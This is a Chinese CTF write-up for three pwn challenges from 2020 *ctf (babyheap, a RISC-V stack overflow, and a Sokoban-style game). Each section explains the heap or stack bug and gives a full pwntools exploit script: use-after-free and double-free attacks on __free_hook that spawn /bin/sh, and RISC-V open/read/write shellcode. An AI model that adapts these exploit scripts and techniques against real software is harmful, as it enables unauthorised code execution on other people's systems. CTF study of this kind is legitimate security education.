> 原文链接: https://www.anquanke.com//post/id/229220 


# 2020 *ctf 部分pwn writeup


                                阅读量   
                                **219714**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p0.ssl.qhimg.com/t01f24e09150a7d4563.png)](https://p0.ssl.qhimg.com/t01f24e09150a7d4563.png)



感谢[xmzyshypnc](https://ama2in9.top) 师傅和xxrw师傅手把手教学。

## babyheap

漏洞是一个`UAF`漏洞，程序实现了`6`个程序，`add,delete,edit,show,leave_name,show_name`，其中`add`函数限制了申请堆块的大小，`delete`函数中存在`UAF`漏洞，`leave_name`函数中申请了一个`0x400`大小的堆块。

因此这里首先申请`4`个`0x20,fastbin`，接着`leave_name`函数申请一个较大的堆块，使得`fastbin`堆块合并成`0x80`大小的`small bin`，这样就能泄漏出`libc`基址，由于`edit`的起始位置是`+8`开始的，因此再次申请的堆块大小需要覆盖三个`fastbin`，因此申请一个`0x60`大小的堆块。这样就可以满足覆写`fd`指针为`free_hook-8`和`/bin/sh`字符串两个要求。

```
# encoding=utf-8
from pwn import *

file_path = "./pwn"
context.arch = "amd64"
context.log_level = "debug"
context.terminal = ['tmux', 'splitw', '-h']
elf = ELF(file_path)
debug = 0
if debug:
    p = process([file_path])
    # gdb.attach(p, "b *$rebase(0xdd9)")
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    one_gadget = 0x0

else:
    p = remote('52.152.231.198', 8081)
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    one_gadget = 0x0


def add(index, size):
    p.sendlineafter("&gt;&gt; \n", "1")
    p.sendlineafter("input index\n", str(index))
    p.sendlineafter("input size\n", str(size))


def delete(index):
    p.sendlineafter("&gt;&gt; \n", "2")
    p.sendlineafter("input index\n", str(index))


def edit(index, content):
    p.sendlineafter("&gt;&gt; \n", "3")
    p.sendlineafter("input index\n", str(index))
    p.sendafter("input content\n", content)


def show(index):
    p.sendlineafter("&gt;&gt; \n", "4")
    p.sendlineafter("input index\n", str(index))


def leave_name(name):
    p.sendlineafter("&gt;&gt; \n", "5")
    p.sendafter("your name:\n", name)


def show_name():
    p.sendlineafter("&gt;&gt; \n", "6")


for i in range(11):
    add(i, 0x18)
for i in range(7):
    delete(i + 4)

delete(0)
delete(1)
delete(2)
delete(3)
leave_name("1212")
show(0)

libc.address = u64(p.recvline().strip(b"\n").ljust(8, b"\x00")) - 0xd0 - 0x10 - libc.sym['__malloc_hook']

for i in range(7):
    add(i + 4, 0x18)

# gdb.attach(p, "b *$rebase(0xdd9)")

log.success("libc address is `{``}`".format(hex(libc.address)))

add(11, 0x60)
delete(1)
payload = b"a"*0x10 + p64(0x61) + p64(libc.sym['__free_hook'] - 0x8)
payload += b"b"*0x10 + p64(0x21) + b"/bin/sh\x00"
edit(11, payload)
add(12, 0x50)
add(13, 0x50)
edit(13, p64(libc.sym['system']))
delete(2)

p.interactive()
```



## Favourite Architecure flag1

`riscv`栈溢出的漏洞，但是`ghidra`反编译失败，不知道咋回事。漏洞存在于输入`flag`的地方。

```
00010436 b7 e7 04 00     lui        a5=&gt;DAT_0004e000,0x4e               = FFh
0001043a 13 85 07 89     addi       a0=&gt;s_Input_the_flag:_0004d890,a5,-0x770 = "Input the flag: "
0001043e ef 50 d0 41     jal        ra,FUN_0001605a    //output()
00010442 93 07 84 ed     addi       a5,s0,-0x128   //&lt;&lt; input_falg str 
00010446 3e 85           c.mv       a0,a5
00010448 ef 60 20 61     jal        ra,read             //read()
0001044c 93 07 84 ed     addi       a5,s0,-0x128
00010450 3e 85           c.mv       a0,a5
00010452 ef 00 21 09     jal        ra,strlen           //strlen()
00010456 aa 86           c.mv       a3,a0
00010458 03 a7 01 86     lw         a4,-0x7a0(gp)
0001045c 83 a7 41 86     lw         a5,-0x79c(gp)
00010460 b9 9f           c.addw     a5,a4
00010462 81 27           c.addiw    a5,0x0
00010464 82 17           c.slli     a5,0x20
00010466 81 93           c.srli     a5,0x20
00010468 63 94 f6 10     bne        a3,a5,LAB_00010570  //不等于0x59就跳转
//...
LAB_00010570                                    XREF[1]:     00010468(j)  
00010570 01 00           c.nop
00010572 21 a0           c.j        LAB_0001057a
//...
LAB_0001057a                                    XREF[2]:     00010572(j), 00010576(j)  
0001057a b7 e7 04 00     lui        a5=&gt;DAT_0004e000,0x4e                            = FFh
0001057e 13 85 87 8f     addi       a0=&gt;s_You_are_wrong_._._0004d8f8,a5,-0x70= "You are wrong ._."
00010582 ef 60 60 64     jal        ra,FUN_00016bc8              //output()
00010586 85 47           c.li       a5,0x1
LAB_00010588                                    XREF[1]:     0001056e(j)  
00010588 3e 85           c.mv       a0,a5
0001058a fe 70           c.ldsp     ra,0x1f8(sp)
0001058c 5e 74           c.ldsp     s0,0x1f0(sp)
0001058e 13 01 01 20     addi       sp,sp,0x200
00010592 82 80           ret
```

从第一层的逻辑看来，首先是`read`了一个很长的字符串（注意到这里的函数不一定是`read`，功能类似）。但是分配的长度才是`0x128`字节大小，因此这里可以溢出。并且如果我们输入的长度不为`0x59`那么直接会跳转到错误输出的位置之后结束进程，在结束进程的时候读取了`sp+0x1f8`的位置的值作为返回地址，因此我们可以直接溢出到返回地址。那么接下来就是如何利用的问题。

注意到题目给出的`patch`文件

```
diff --git a/linux-user/syscall.c b/linux-user/syscall.c
index 27adee9..2d75464 100644
--- a/linux-user/syscall.c
+++ b/linux-user/syscall.c
@@ -13101,8 +13101,31 @@ abi_long do_syscall(void *cpu_env, int num, abi_long arg1,
         print_syscall(cpu_env, num, arg1, arg2, arg3, arg4, arg5, arg6);
     `}`

-    ret = do_syscall1(cpu_env, num, arg1, arg2, arg3, arg4,
-                      arg5, arg6, arg7, arg8);
+    switch (num) `{`
+        // syscall whitelist
+        case TARGET_NR_brk:
+        case TARGET_NR_uname:
+        case TARGET_NR_readlinkat:
+        case TARGET_NR_faccessat:
+        case TARGET_NR_openat2:
+        case TARGET_NR_openat:
+        case TARGET_NR_read:
+        case TARGET_NR_readv:
+        case TARGET_NR_write:
+        case TARGET_NR_writev:
+        case TARGET_NR_mmap:
+        case TARGET_NR_munmap:
+        case TARGET_NR_exit:
+        case TARGET_NR_exit_group:
+        case TARGET_NR_mprotect:
+            ret = do_syscall1(cpu_env, num, arg1, arg2, arg3, arg4,
+                    arg5, arg6, arg7, arg8);
+            break;
+        default:
+            printf("[!] %d bad system call\n", num);
+            ret = -1;
+            break;
+    `}`

     if (unlikely(qemu_loglevel_mask(LOG_STRACE))) `{`
         print_syscall_ret(cpu_env, num, ret, arg1, arg2,
```

我们看到其只允许调用特定的系统调用，也就是我们只能编写`orw shellcode`，而程序没有开启`pie`，也就是栈地址固定不变（需要注意的是本地栈地址和远程不一样，因此需要添加滑板指令）。

`shellcode`的编写参考网上的`shellcode`

```
.section .text
.globl _start
.option rvc
_start:
    #open
    li a1,0x67616c66 #flag
    sd a1,4(sp)
    addi a1,sp,4
    li a0,-100
    li a2,0
    li a7, 56 # __NR_openat
    ecall
    # read
    c.mv a2,a7
    addi a7,a7,7
    ecall
    # write
    li a0, 1
    addi a7,a7,1
    ecall
```

```
10078:    676175b7              lui    a1,0x67617
1007c:    c665859b              addiw    a1,a1,-922
10080:    00b13223              sd    a1,4(sp)
10084:    004c                  addi    a1,sp,4
10086:    f9c00513              li    a0,-100
1008a:    4601                  li    a2,0
1008c:    03800893              li    a7,56
10090:    00000073              ecall
10094:    8646                  mv    a2,a7
10096:    089d                  addi    a7,a7,7
10098:    00000073              ecall
1009c:    4505                  li    a0,1
1009e:    0885                  addi    a7,a7,1
100a0:    00000073              ecall
```

最终的`exp`

```
# encoding=utf-8
from pwn import *

file_path = "./main"
context.arch = "amd64"
context.log_level = "debug"
context.terminal = ['tmux', 'splitw', '-h']
elf = ELF(file_path)
debug = 0
if debug:
    p = process(["./qemu-riscv64", "-g", "1234", file_path])
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    one_gadget = 0x0

else:
    p = remote('119.28.89.167', 60001)


stack = 0x4000800c70
nop = p32(0x00000013)


p.recvuntil("Input the flag: ")
payload = b"a"*0x118
payload += p64(stack)*2

shellcode = nop * 0xd0
shellcode += p32(0x676175b7) + p32(0xc665859b) + p32(0x00b13223)
shellcode += p16(0x004c) + p32(0xf9c00513) + p16(0x4601)
shellcode += p32(0x03800893) + p32(0x00000073) + p16(0x8646)
shellcode += p16(0x089d) + p32(0x00000073) + p16(0x4505) + p16(0x0885) + p32(0x00000073)

payload += shellcode

p.sendline(payload)

p.interactive()
```



## babygame

程序实现了一个类似于迷宫的操作，提供了如下的几种功能

```
h
     Sokoban
How to Play:
    Push all boxs into target place
Map:
    1)█:wall
    2)○:Target
    3)□:Box
    4)♀:Player
    5)●:Box on target
Command:
    1)h: show this message
    2)q: quit the game
    3)w: move up
    4)s: move down
    5)a: move left
    6)d: move right
    7)b: move back
    8)m: leave message
    k)n: show name
    10)l: show message
```

目前逆向出的`game`结构体如下，其中`map`另有结构体存储。

```
00000000 game            struc ; (sizeof=0x50, mappedto_7)
00000000 map_vector_start dq ?
00000008 current_vector  dq ?
00000010 vector_end      dq ?
00000018 start_time      dq ?
00000020 end_time        dq ?
00000028 cost_time       dq ?
00000030 level           dd ?
00000034 unknown         dd ?
00000038 step_forward    db ?
00000039 is_quit         db ?
0000003A                 db ? ; undefined
0000003B                 db ? ; undefined
0000003C                 db ? ; undefined
0000003D                 db ? ; undefined
0000003E                 db ? ; undefined
0000003F                 db ? ; undefined
00000040 map             dq ?
00000048 message         dq ?
00000050 game            ends
```

程序的主要逻辑如下

```
__int64 __usercall main@&lt;rax&gt;(__int64 a1@&lt;rdi&gt;, char **a2@&lt;rsi&gt;, char **a3@&lt;rdx&gt;, unsigned int a4@&lt;r12d&gt;)
`{`
  __int64 v4; // rdi
  char v6; // [rsp+Eh] [rbp-2h]

  v6 = 1;
  while ( v6 )
  `{`
    game_func(a4);
    v4 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, "restart?");
    std::ostream::operator&lt;&lt;(v4, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);
    if ( (unsigned __int8)get_input_filter(v4, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;) != 121 )
      v6 = 0;
  `}`
  return 0LL;
`}`

unsigned __int64 __usercall game_func@&lt;rax&gt;(unsigned int a1@&lt;r12d&gt;)
`{`
  unsigned __int64 result; // rax
  char v2; // [rsp+0h] [rbp-90h]
  unsigned __int64 v3; // [rsp+78h] [rbp-18h]

  v3 = __readfsqword(0x28u);
  init_game((game *)&amp;v2, 0);
  game_start((game *)&amp;v2, 0LL, a1);
  result = leave_name((__int64)&amp;v2);
  __readfsqword(0x28u);
  return result;
`}`

void __usercall game_start(game *a1@&lt;rdi&gt;, unsigned __int64 a2@&lt;rsi&gt;, unsigned int a3@&lt;r12d&gt;)
`{`
  char num; // ST1F_1
  game *a1a; // [rsp+8h] [rbp-18h]

  a1a = a1;
  sub_FE91();
  a1-&gt;step_forward = 1;
  a1-&gt;level = -1;
  while ( !a1a-&gt;is_quit )
  `{`
    while ( a1a-&gt;level == -1 &amp;&amp; !a1a-&gt;is_quit )
    `{`
      num = get_input((__int64)a1, (void *)a2);
      a2 = (unsigned int)num;
      a1 = a1a;
      detec_error_quit(a1a, num);
    `}`
    if ( a1a-&gt;is_quit )
      break;
    get_map(a1a);
    handle_step(a1a, a3);
    a1 = a1a;
    put_map_vector(a1a);
  `}`
  sub_FE98();
`}`

unsigned __int64 __fastcall leave_name(game *a1)
`{`
  __int64 v1; // rdi
  __int64 v2; // rax
  game *v4; // [rsp+8h] [rbp-48h]
  __int64 name; // [rsp+20h] [rbp-30h]
  unsigned __int64 v6; // [rsp+48h] [rbp-8h]

  v4 = a1;
  v6 = __readfsqword(0x28u);
  v1 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, "leave your name?");
  std::ostream::operator&lt;&lt;(v1, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);
  if ( (unsigned __int8)get_input_filter(v1, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;) == 'y' )
  `{`
    v2 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, "your name:");
    std::ostream::operator&lt;&lt;(v2, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);
    std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::basic_string(&amp;name);
    std::getline&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;(&amp;std::cin, &amp;name);
    put_name_to_vector((game *)&amp;::a1, (__int64)&amp;name);
    std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::~basic_string(&amp;name, &amp;name);
  `}`
  clear_map_vector(v4);
  operator delete((void *)v4-&gt;message);
  sub_C026(v4);
  return __readfsqword(0x28u) ^ v6;
`}`
```

程序存在两个漏洞，一个是算是`message`脏数据。首先在`init_game`函数中为`game-&gt;message`分配空间的时候并没有清空内存中的数据，而`message`的堆块大小为`0x510`，也就是说释放之后重新申请即可以泄漏得到`libc`基址。程序恰好存在`restart`的情况，因此我们可以据此泄漏得到`libc`基址。

```
send_level("q")
send_order("n")
send_order("y")
send_level("l")
p.recvuntil("message:")
libc.address = u64(p.recvline().strip(b"\n").ljust(8, b"\x00")) - 96 - 0x10 - libc.sym['__malloc_hook']
log.success("libc address is `{``}`".format(hex(libc.address)))
```

另一个就是`map+0xe0`处保存指针的`double free`漏洞。该处的漏洞是在调试中发现的，在`update level`之后会退出会出现一个`double free`的漏洞，堆块的大小是`0x60`。那么接下来就是`double free`如何利用的问题了。我们能够进行任意堆块分配的就是`message`了。但是程序中采用的是`cin`进行读取的，不能覆盖到`0x60`的堆块。但是我们看到在读取得到`message`之后会将其`put vector`。在该函数中会按照我们输入的`message`的长度进行堆块申请

```
if ( current_vector_c )
  current_vector_c = std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::basic_string(
    current_vector_c,
    name_c);
```

这里就达到了我们任意申请堆块的目的。下面就是正常的`double free`的操作了。这里注意的是`put_name_vector`函数调用结束之后就是`name`的析构函数。

```
put_name_to_vector((game *)&amp;::a1, (__int64)&amp;name);
std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::~basic_string(
(__int64)&amp;name,
(__int64)&amp;name);
```

在我们覆写完毕`free_hook`之后此处是第一次调用的位置（需要注意`name vector`的扩展情况），因此我们将`name`的起始八个字节改为`/bin/sh`，覆写的`fd`指针自然变为`free_hook-0x8`。

```
# encoding=utf-8
from pwn import *

file_path = "./pwn"
context.arch = "amd64"
context.log_level = "debug"
context.terminal = ['tmux', 'splitw', '-h']
elf = ELF(file_path)
debug = 0
if debug:
    p = process([file_path])
    # gdb.attach(p, "b *$rebase(0xB56b)\nb *$rebase(0xB166)\nb *$rebase(0xa70d)\nb *$rebase(0xb06f)")
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    one_gadget = 0x0

else:
    p = remote('52.152.231.198', 8082)
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    one_gadget = 0x0


def send_order(order):
    p.sendlineafter("Please input an order:\n", order)


def send_level(level):
    p.sendlineafter("Please input an level from 1-9:\n", level)


def leave_name(name):
    p.sendlineafter("your name:", name)


send_level("q")
send_order("n")
send_order("y")
send_level("l")
p.recvuntil("message:")
libc.address = u64(p.recvline().strip(b"\n").ljust(8, b"\x00")) - 96 - 0x10 - libc.sym['__malloc_hook']
log.success("libc address is `{``}`".format(hex(libc.address)))

send_level("1")
send_order("2")
send_order("q")
send_order("n")
leave_name(b"a"*0x70) # name vector 1, ex
send_order("y")

send_level("1")
send_order("q")
send_order("y")
leave_name(p64(libc.sym['__free_hook']- 0x8).ljust(0x50, b"\x00")) # name vector 2, ex
send_order("y")

send_level("1")
send_order("q")
send_order("y")
leave_name(b"a"*0x50) # name vector 3, ex
send_order("y")

send_level("1")
send_order("q")
send_order("y")
leave_name((b"/bin/sh\x00" + p64(libc.sym['system'])).ljust(0x50, b"\x00"))

p.interactive()
```
